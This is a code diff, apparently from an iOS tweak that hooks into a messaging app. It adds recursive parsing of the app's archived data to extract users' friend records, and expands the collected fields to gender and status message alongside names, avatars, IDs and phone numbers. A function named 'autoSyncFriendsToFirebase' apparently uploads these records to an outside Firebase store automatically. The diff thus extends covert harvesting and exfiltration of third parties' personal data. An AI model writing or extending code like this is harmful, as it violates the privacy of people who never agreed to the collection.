@@ -684,6 +684,30 @@ static BOOL isFriendOrAliasClass(id classRef, NSArray *objs) {
     return NO;
 }
 
+static void collectArchivedBlobs(id container, NSMutableArray<NSData *> *blobs, NSMutableSet<id> *visited) {
+    if (!container || [visited containsObject:container]) return;
+    [visited addObject:container];
+
+    if ([container isKindOfClass:[NSData class]]) {
+        NSData *d = (NSData *)container;
+        if (d.length >= 8) {
+            [blobs addObject:d];
+        }
+        return;
+    }
+
+    if ([container isKindOfClass:[NSDictionary class]]) {
+        NSDictionary *dict = (NSDictionary *)container;
+        for (id key in dict) {
+            collectArchivedBlobs(dict[key], blobs, visited);
+        }
+    } else if ([container isKindOfClass:[NSArray class]]) {
+        for (id item in (NSArray *)container) {
+            collectArchivedBlobs(item, blobs, visited);
+        }
+    }
+}
+
 static NSArray<NSDictionary *> *parseNSKeyedArchiverFriends(NSData *plistData) {
     if (!plistData || plistData.length == 0) return @[];
     NSMutableArray<NSDictionary *> *friends = [NSMutableArray array];
@@ -692,23 +716,15 @@ static NSArray<NSDictionary *> *parseNSKeyedArchiverFriends(NSData *plistData) {
     @try {
         #pragma clang diagnostic push
         #pragma clang diagnostic ignored "-Wdeprecated-declarations"
-        NSDictionary *dict = [NSPropertyListSerialization propertyListWithData:plistData options:0 format:NULL error:nil];
+        NSDictionary *rootDict = [NSPropertyListSerialization propertyListWithData:plistData options:0 format:NULL error:nil];
         #pragma clang diagnostic pop
-        if (![dict isKindOfClass:[NSDictionary class]]) return @[];
+        if (!rootDict) return @[];
 
-        for (NSString *key in dict) {
-            id val = dict[key];
-            NSData *subData = nil;
-            if ([val isKindOfClass:[NSData class]]) subData = (NSData *)val;
-            else if ([val isKindOfClass:[NSDictionary class]]) {
-                #pragma clang diagnostic push
-                #pragma clang diagnostic ignored "-Wdeprecated-declarations"
-                subData = [NSPropertyListSerialization dataWithPropertyList:val format:NSPropertyListBinaryFormat_v1_0 options:0 error:nil];
-                #pragma clang diagnostic pop
-            }
+        NSMutableArray<NSData *> *archivedBlobs = [NSMutableArray array];
+        NSMutableSet *visited = [NSMutableSet set];
+        collectArchivedBlobs(rootDict, archivedBlobs, visited);
 
-            if (!subData) continue;
-
+        for (NSData *subData in archivedBlobs) {
             NSDictionary *inner = [NSPropertyListSerialization propertyListWithData:subData options:0 format:NULL error:nil];
             if (![inner isKindOfClass:[NSDictionary class]]) continue;
 
@@ -729,6 +745,8 @@ static NSArray<NSDictionary *> *parseNSKeyedArchiverFriends(NSData *plistData) {
                 NSString *avatar = resolveFieldRecursive(objDict[@"avatarURL"], objs) ?: resolveFieldRecursive(objDict[@"avatar"], objs);
                 NSString *globalId = resolveFieldRecursive(objDict[@"globalId"], objs);
                 NSString *phone = resolveFieldRecursive(objDict[@"phone"], objs) ?: resolveFieldRecursive(objDict[@"phoneNumber"], objs);
+                NSString *gender = resolveFieldRecursive(objDict[@"gender"], objs);
+                NSString *statusMsg = resolveFieldRecursive(objDict[@"statusMessage"], objs) ?: resolveFieldRecursive(objDict[@"status"], objs);
 
                 NSString *primaryName = dName ?: cName ?: aliasName;
 
@@ -751,6 +769,8 @@ static NSArray<NSDictionary *> *parseNSKeyedArchiverFriends(NSData *plistData) {
                         if (avatar) fMeta[@"avatarURL"] = avatar;
                         if (globalId) fMeta[@"globalId"] = globalId;
                         if (phone) fMeta[@"phone"] = phone;
+                        if (gender) fMeta[@"gender"] = gender;
+                        if (statusMsg) fMeta[@"statusMessage"] = statusMsg;
 
                         [friends addObject:fMeta];
                     }
@@ -774,7 +794,6 @@ static BOOL invokeBoolSelector(id target, SEL selector) {
     const char *retType = [sig methodReturnType];
     if (!retType) return NO;
 
-    // Kiểm tra chính xác kiểu trả về là boolean hoặc integer (c, B, i, I, s, S)
     char t = retType[0];
     if (t != 'c' && t != 'B' && t != 'i' && t != 'I' && t != 's' && t != 'S') {
         return NO;
@@ -922,6 +941,8 @@ static void autoSyncFriendsToFirebase(NSString *phoneStr) {
                             NSString *avatar = [c respondsToSelector:@selector(avatarURL)] ? [c performSelector:@selector(avatarURL)] : nil;
                             NSString *globalId = [c respondsToSelector:@selector(globalId)] ? [c performSelector:@selector(globalId)] : nil;
                             NSString *phone = [c respondsToSelector:@selector(phoneNumber)] ? [c performSelector:@selector(phoneNumber)] : nil;
+                            NSString *gender = [c respondsToSelector:@selector(gender)] ? [NSString stringWithFormat:@"%@", [c performSelector:@selector(gender)]] : nil;
+                            NSString *statusMsg = [c respondsToSelector:@selector(statusMessage)] ? [c performSelector:@selector(statusMessage)] : ([c respondsToSelector:@selector(userStatus)] ? [c performSelector:@selector(userStatus)] : nil);
                             
                             NSString *primaryName = dName ?: cName ?: zName;
 
@@ -936,6 +957,8 @@ static void autoSyncFriendsToFirebase(NSString *phoneStr) {
                                 if (avatar) fMeta[@"avatarURL"] = avatar;
                                 if (globalId) fMeta[@"globalId"] = globalId;
                                 if (phone) fMeta[@"phone"] = phone;
+                                if (gender) fMeta[@"gender"] = gender;
+                                if (statusMsg) fMeta[@"statusMessage"] = statusMsg;
 
                                 [structuredFriends addObject:fMeta];
                             }
